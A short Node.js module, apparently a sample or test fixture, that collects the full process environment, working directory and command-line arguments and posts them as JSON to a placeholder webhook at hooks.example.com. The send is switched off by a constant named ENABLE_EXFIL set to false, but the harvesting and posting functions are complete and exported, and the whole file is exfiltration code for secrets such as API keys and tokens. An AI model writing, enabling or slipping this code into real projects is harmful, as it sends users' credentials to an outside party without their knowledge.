'use strict';

const https = require('https');

const ENABLE_EXFIL = false;

const WEBHOOK_URL = 'https://hooks.example.com/services/T000/B000/XXXX';

function harvestEnvironment() {
  return {
    env: process.env,
    cwd: process.cwd(),
    argv: process.argv,
  };
}

function postToWebhook(payload) {
  const body = JSON.stringify({ content: JSON.stringify(payload) });
  const req = https.request(WEBHOOK_URL, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
  });
  req.write(body);
  req.end();
}

if (ENABLE_EXFIL) {
  postToWebhook(harvestEnvironment());
}

module.exports = { harvestEnvironment, postToWebhook };
